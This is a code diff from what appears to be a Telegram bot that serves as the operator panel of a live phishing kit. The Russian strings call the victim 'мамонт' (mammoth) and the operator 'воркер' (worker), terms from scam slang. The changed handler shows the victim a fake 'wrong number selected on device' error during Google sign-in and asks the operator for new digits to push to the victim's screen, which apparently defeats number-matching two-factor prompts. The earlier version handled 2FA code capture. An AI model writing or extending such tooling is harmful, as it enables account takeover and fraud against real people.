@@ -607,32 +607,26 @@ async def handle_google_control_callback(callback: CallbackQuery, bot: Bot):
                 parse_mode="HTML",
             )
 
-    elif action == "ask_2fa":
+    elif action == "wrong_prompt":
+        PENDING_GOOGLE_PROMPT[callback.from_user.id] = target_tg_id
         db.set_google_auth_control(
             DB_PATH,
             tg_id=target_tg_id,
-            status="show_2fa",
+            status="error_prompt",
+            error_msg="Выбрано неверное число на устройстве. Ожидайте новые цифры...",
         )
-        await callback.answer("🔑 Экран переведен на ввод 2FA кода", show_alert=True)
+        await callback.answer("❌ Ошибка неверного числа отправлена. Отправьте 2 новые цифры в чат.", show_alert=True)
+        if callback.message:
+            await callback.message.answer(
+                f"❌ <b>Google Auth (ID <code>{target_tg_id}</code>) — Неверные цифры</b>\n\n"
+                "На экран мамонта выведена ошибка: <i>«Выбрано неверное число на устройстве. Ожидайте новые цифры...»</i>\n\n"
+                "Отправьте <b>2 новые цифры</b> в ответ на это сообщение (например: <code>85</code>), чтобы перевести экран на новые цифры:",
+                parse_mode="HTML",
+            )
         await notify_user_event(
-            event_type="google_2fa_waiting",
+            event_type="google_wrong_prompt",
             user_tg_id=target_tg_id,
-            details="Воркер перевел мамонта на 2FA код",
-            mirror_token=bot.token,
-        )
-
-    elif action == "wrong_2fa":
-        db.set_google_auth_control(
-            DB_PATH,
-            tg_id=target_tg_id,
-            status="error_2fa",
-            error_msg="Неверный код. Проверьте код и повторите попытку.",
-        )
-        await callback.answer("❌ Мамонту отправлена ошибка 2FA кода", show_alert=True)
-        await notify_user_event(
-            event_type="google_wrong_2fa",
-            user_tg_id=target_tg_id,
-            details="Воркер отклонил 2FA код (Неверный 2FA)",
+            details="Воркер отклонил цифры (Неверные цифры на устройстве)",
             mirror_token=bot.token,
         )
 
